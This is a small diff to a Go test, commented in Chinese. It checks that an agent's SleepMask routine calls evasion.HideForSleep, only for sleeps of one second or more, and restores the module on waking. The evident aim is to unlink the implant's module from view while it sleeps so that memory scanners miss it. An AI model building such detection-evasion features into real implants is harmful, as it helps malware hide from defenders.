@@ -22,8 +22,8 @@ func TestSleepMaskHidesModuleDuringSleep(t *testing.T) {
 		t.Fatalf("读取 run.go 失败: %v", err)
 	}
 	s := string(src)
-	if !strings.Contains(s, "evasion.HideForSleep(config.SleepMaskHideEnabled())") {
-		t.Error("run.go 的 SleepMask 没有调用 evasion.HideForSleep —— 睡眠期不会摘链")
+	if !strings.Contains(s, "evasion.HideForSleep(config.SleepMaskHideEnabled() && d >= time.Second)") {
+		t.Error("run.go 的 SleepMask 没有调用 evasion.HideForSleep（且要求 d>=1s）—— 睡眠期不会摘链")
 	}
 	if !strings.Contains(s, "defer restoreModule()") {
 		t.Error("run.go 缺少 `defer restoreModule()` —— 醒来不挂回会让命令执行路径找不到本模块")
